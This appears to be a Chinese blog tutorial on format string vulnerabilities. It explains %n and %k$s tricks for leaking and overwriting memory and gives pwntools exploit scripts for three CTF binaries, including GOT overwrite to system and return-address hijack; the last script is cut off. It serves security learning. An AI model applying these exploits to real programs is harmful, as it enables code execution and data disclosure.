<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="格式化字符串"><meta name="keywords" content="Pwn"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>格式化字符串【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/SecondBC/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="toc-number">3.</span> <span class="toc-text">泄露内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%8F%98%E9%87%8F%E5%86%85%E5%AD%98"><span class="toc-number">3.1.</span> <span class="toc-text">泄露栈变量内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%A5%E5%8F%98%E9%87%8F%E4%B8%BA%E6%8C%87%E9%92%88%E6%8C%87%E5%90%91%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-number">3.2.</span> <span class="toc-text">泄露以变量为指针指向的内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98"><span class="toc-number">4.</span> <span class="toc-text">覆盖内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-number">4.1.</span> <span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-number">4.2.</span> <span class="toc-text">覆盖大数字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">基本用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#goodluck"><span class="toc-number">5.1.</span> <span class="toc-text">goodluck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hijack-GOT"><span class="toc-number">5.2.</span> <span class="toc-text">hijack GOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hijack-retaddr"><span class="toc-number">5.3.</span> <span class="toc-text">hijack retaddr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93"><span class="toc-number">6.</span> <span class="toc-text">字符串盲打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.</span> <span class="toc-text">栈泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81got"><span class="toc-number">6.2.</span> <span class="toc-text">劫持got</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color10"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">38</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">格式化字符串</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2023-04-13 | 更新于 2023-04-13</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div></div><div class="main-content"><p>具体见：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_2">利用 - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h2><p>在使用printf函数时，会用到如下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%d			<span class="comment">//打印整数</span></span><br><span class="line">%x			<span class="comment">//打印十六进制</span></span><br><span class="line">%p			<span class="comment">//打印指针数值（32位打印4字节，64位打印8字节）</span></span><br><span class="line">%s			<span class="comment">//打印字符串（打印地址指向的内容）</span></span><br><span class="line">%n			<span class="comment">//将该格式化之前的字符数量通过地址存入变量中；</span></span><br></pre></td></tr></table></figure>

<p>这里重点说明下 %s，%n；</p>
<p>%s 虽说时用来打印字符串的，但其本质是将参数视作指针，打印指针指向的内容，一直显示到 ‘\x00’ ，当使用 recv() 函数接收时，得到的是 byte 类型，所以可以得到 int 类型；</p>
<p>%n 如下图所示：</p>
<p><img src="https://s2.loli.net/2023/04/13/pYgjawuVRLskP4A.png" alt="%n"></p>
<p>它将存储出现在 %n 之前的字符数量到对应的参数变量中，本身不会有任何显示；</p>
<p>如上图实际打印的内容是： “geeks for geeks” ；</p>
<p>且 %n 一般跑在gcc编译的c中，Windows上的编译器会有问题；</p>
<p>同样只能跑在 gcc 中的另类写法，也是格式化字符串利用的核心：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure>

<p>用下面代码举例，上面的写法会打印出printf的第4个参数的hex形式，也就是c；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure>

<p>3的意思是从格式化字符串开始往后算的第三个参数，x表示格式；</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在32位程序中，调用函数时，变量都是存在栈上的，比如当调用下示代码时，会有如此的栈格式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure>

<p>栈：</p>
<table>
<thead>
<tr>
<th>ebp-&gt;</th>
<th>0xold_ebp          //printf函数内部栈帧</th>
</tr>
</thead>
<tbody><tr>
<td>0地址</td>
<td>0xretaddr          //返回地址</td>
</tr>
<tr>
<td>1地址</td>
<td>0xstringaddr       //格式化字符串 “%3$x” 地址</td>
</tr>
<tr>
<td>2地址</td>
<td>a</td>
</tr>
<tr>
<td>3地址</td>
<td>b</td>
</tr>
<tr>
<td>4地址</td>
<td>c</td>
</tr>
<tr>
<td>5地址</td>
<td>d</td>
</tr>
</tbody></table>
<p>当然真实情况中，这些参数的顺序会有变化（一般就是这样），但是可以通过调试确定下来；</p>
<p>格式化字符串符号 <code>%</code> 的作用就是：读取栈中这些变量的内容，对应的将其打印出来；</p>
<p>第一个%打印第一个参数，第二个%打印第二个参数，也就是栈中的a，b；</p>
<p>当然用特殊的写法可打印对应的参数的内容；</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用 <code>%k$p</code> 获取数据内容，利用 <code>%k$s</code> 获取指针指向的内容，利用 <code>[AimAddr]%k$s</code> 获取指定地址处的内容；</p>
<h3 id="泄露栈变量内存"><a href="#泄露栈变量内存" class="headerlink" title="泄露栈变量内存"></a>泄露栈变量内存</h3><p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$x&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>它没有跟参数能这样写吗？</p>
<p>答案是可以，拿上面用表格画的栈图来说，此时它的作用就是将3地址的内容以十六进制打印出来，尽管此时3地址里放的是奇怪的东西；</p>
<p>于是就可以先算出想要得到的 在main栈帧 里的数据对于地址1的间隔 k；</p>
<p>比如现在main中想得到其上级函数的ebp值，调试可知ebp的值存于 m地址 中，那么 k 就应该是：<br>$$<br>k = （m地址 - 1地址） / 指针长度<br>$$<br>指针长度即为对齐，32位是4，64位是8；</p>
<p>此时执行    <code>printf(&quot;%k$p&quot;);</code>    便可得到main中储存的上级函数ebp的值；</p>
<p>这个k的数值，也同样是printf函数的第 k+1 个参数，因为1地址中存的是格式化字符串，也就是printf函数的第 1 个参数；</p>
<h3 id="泄露以变量为指针指向的内存"><a href="#泄露以变量为指针指向的内存" class="headerlink" title="泄露以变量为指针指向的内存"></a>泄露以变量为指针指向的内存</h3><p>还记得 %s 的作用吗，它会打印出以变量为指针所指的内容；</p>
<p>got表就是一个指针，对于在got表地址上的函数，其实都是指向其真实存在的地址的指针；</p>
<p>假设scanf在got中的地址就是0x12345678，那么利用如下代码，便可打印出 scanf 函数的真实地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x12345678%x%k$s&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>当此格式化字符串在输出函数调用时是第 k+1个参数的时候，这么写，就能让 %k$s 去格式化 0x12345678 字符串，从而就能得到 0x12345678 指向的内容，进而打印出来得到 scanf 真正的地址；</p>
<p>但很多时候，第k + 1个参数是 “3456..” 或者干脆 “烫烫烫0x1234..” 诸如此类的；</p>
<p>意思是，它并没有对齐，所以当调试结果为上述情况时，请在0x12345678地址前添加垃圾信息，使得在 整数倍的 k + 1 上能够直接拿到 0x12345678 地址，进而使得后面的特殊写法打印出该地址指向的内容；</p>
<p>获取栈中指定指针内存就没那么麻烦了，正如泄露变量内存一样的写法，只是将p改为s；</p>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>这个时候，%n会帮大忙，它可以将其对应参数视为指针，以int型填入在%n前面的字符数量；</p>
<p>所以当知道要覆盖内存的<strong>地址</strong>，格式化字符串相对于输出函数的<strong>偏移</strong>就可以进行覆盖了；</p>
<p>具体格式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[AimAddr]...%k$n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如上的…为垃圾内容负责填充 AimAddr 的对齐，k要找到 AimAddr的位置，后面的…是为了与前面的字符一起扩展成想要的长度，使其填入 AimAddr 中；</p>
<h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>此时要把 AimAddr 放在 %n 的后面，这样能控制填入的数据始终可以小于4；</p>
<p>具体格式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...%k$n...[AimAddr]&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时…的作用就反转了，前面的是控制写入的数，后者为控制地址的对齐；</p>
<h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>可以用 … 来扩展很长很长，但会使得程序的性能变低，出来的速度下降；</p>
<p>以 %hhn 来写，可以使得填入变量的类型为字节，以 %hn 来写，可以使得填入变量的类型为双字；</p>
<p>由此可以控制单个字节的覆盖；</p>
<p>而一个int型是需要占4个字节的，那么分别填入单字节内容，使其最后呈现出大数字的效果就行；</p>
<p>比如：c变量的地址为：[c]，而想对其填入0x12345678则其内存中应该是如此分布的：</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>[c]</td>
<td>0x78</td>
</tr>
<tr>
<td>[c+1]</td>
<td>0x56</td>
</tr>
<tr>
<td>[c+2]</td>
<td>0x34</td>
</tr>
<tr>
<td>[c+3]</td>
<td>0x12</td>
</tr>
</tbody></table>
<p>x86为小端序存储；</p>
<p>那么对应printf中的内容应该是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[c][c+1][c+2][c+3]...%k$hhn...%k+1$hhn...%k+2$hhn...%k+3$hhn&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使得k能找到[c]的位置，且控制 %k$hhn 前面的数量为 0x78 ，而第二个%hhn的控制数量应该是 0x156，因为只能增大，不能减小，但是填入的是一个字节的内容，所以只会填入 0x56，后面同理；</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>用题来举例；</p>
<h3 id="goodluck"><a href="#goodluck" class="headerlink" title="goodluck"></a>goodluck</h3><p>看IDA的main函数：</p>
<p><img src="https://s2.loli.net/2023/04/12/cbldO6YQeJKvHPm.png" alt="main"></p>
<p>可以看的出来整个程序逻辑为，输入后和远程服务器的flag文件比较，仅此而已；</p>
<p>但是它会用printf泄露出输入的内容，所以可以想到用格式化字符串的方法泄露v10的信息；</p>
<p>因为程序是x64，所以函数存放参数的话，是先放在前6个寄存器中，多余的参数放在栈上，所以寻找到合适的栈偏移后，需要加上6；</p>
<p><img src="https://s2.loli.net/2023/04/12/7FrviJtwasYpzeo.png" alt="gdb"></p>
<p>如上图，这是在printf函数内部，此时的栈图rsp刚刚指向返回地址，那么下面的就都可以看成是 “参数” 了；</p>
<p>可以看到构造的flag文件的内容被放到了rsp往下第四个，加上前6个参数，这算作printf函数的第10个参数，所以在邪路时，写为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%9$s&quot;</span></span><br></pre></td></tr></table></figure>

<p>用指针方式读出该flag；</p>
<p>解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$s&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;what&#x27;s the flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>



<h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p>未开启 RELRO 保护（Partial RELRO）的程序是可以修改 GOT 表的；</p>
<p>那么可以覆盖System地址给目标函数的地址到got表，此时执行目标函数也就是执行System函数了；</p>
<p>一般步骤：</p>
<ol>
<li><p>获取目标函数的got表地址：IDA查询；</p>
</li>
<li><p>获取System函数的内存地址：通过泄露计算；</p>
</li>
<li><p>写入：运用ROP或者write函数或者%n覆盖；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//此时目标函数为printf</span><br><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</span><br></pre></td></tr></table></figure></li>
</ol>
<p>看题：</p>
<p>查看IDA代码：</p>
<p><img src="https://s2.loli.net/2023/04/12/FEYWX9sbKqay3HM.png" alt="main"></p>
<p>主函数一开始有个比较密码，这个逆向还原就行；</p>
<p>接下来是模拟shell，可以输入三种命令：put get dir，分别创建 file_head ，打印content，打印 file_head；</p>
<p>这个题里不存在栈溢出，所以没办法ret，但却是 partial relro，且有格式化字符串漏洞；</p>
<p>所以可以把puts的got表作为指针修改为System地址去执行，因为两个参数类型数量也一样，满足调用约定；</p>
<p>则binsh字符串写入file_head中，格式化字符串漏洞的内容写入content；</p>
<p>此时可以通过格式化字符串漏洞泄露出printf got表地址，从而得到system函数地址；</p>
<p>具体思路：</p>
<ol>
<li>通过密码；</li>
<li>执行put，写入任意和字符串漏洞内容；</li>
<li>执行get，泄露system地址；</li>
<li>执行put，写入字符串漏洞%n覆盖got表指向地址；</li>
<li>执行get，完成got表覆盖；</li>
<li>再次执行put，写入binsh字符串；</li>
<li>执行dir，完成攻击；</li>
</ol>
<p>首先通过调试把字符串漏洞的偏移确定下来为8；也就是 <code>%7$s</code>；</p>
<p>通过代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">putsgot = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入密码</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name (ftp.hacker.server:Rainism):&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put泄露地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line">p.sendline(p32(printfgot) + <span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露printf地址并计算system地址</span></span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">libc.address = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put覆盖地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"><span class="comment">#pwntools自行构建覆盖payload，7是字符串相对于第一个参数偏移</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;putsgot:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#最后一次执行put</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;deadbeaf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行dir实现攻击</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>至于为什么前两次发送 file_head 的时候要加\X00，是因为最后执行system(s)的时候，s会有bug，不加00的话，最后的结果是三串字符串连接在一起，导致system找不到路径；</p>
<h3 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h3><p>最重要的思想：通过rbp取栈地址；</p>
<p>查看IDA：</p>
<p><img src="https://s2.loli.net/2023/04/13/3caMnmDPT1EVS2v.png" alt="main"></p>
<p>上面是main函数，一开始会让输入账户和密码，也就是register函数，同时是两个可以利用的缓冲区；</p>
<p>进入choice函数后，和上道题一样，有三个选择，其中edit是重新写入账户密码，show是两次字符串漏洞，quit是执行一个puts函数；</p>
<p>但这道题开启了RELRO保护，所以不能和上道题一样改变puts的got表，所以思想是覆盖返回地址；</p>
<p>返回地址在栈上，既然要覆盖它，就必须拿到栈上的地址，那么rbp存储的内容就很值得推敲了；</p>
<p>在show中拥有两次字符串漏洞，分别展示之前输入的账户和密码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400B07</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">char</span> format, <span class="keyword">int</span> a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在此程序的地址：0x4008AA处，会发现一个system(“/bin/sh”)的调用，那么可以利用字符串漏洞覆盖返回地址为该地址；</p>
<p>输入se和ss并在return的printf处打下断点并查看栈图：</p>
<p><img src="https://s2.loli.net/2023/04/13/q5evKfMHBwygnWp.png" alt="stack"></p>
<p>可以看到printf的第三个参数是输入的账号，第一排为printf的返回地址，而第二个参数是show函数的返回地址，如下方汇编所示；</p>
<p>第一个参数是show函数的rbp指向，则旧rbp值也是指向栈的，所以可以利用旧rbp值来进行便宜计算，拿到返回地址的地址；<br>$$<br>c0 - 80 - 8 = 38<br>$$<br>则用旧rbp值减去0x38便可以得到返回choice函数地址的地址；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">	i = <span class="built_in">len</span></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	new_c = [<span class="number">0</span>] * i</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">		new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">	j -= <span class="number">2</span></span><br><span class="line">	res = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line">		<span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme_k0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;Aanyway&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span 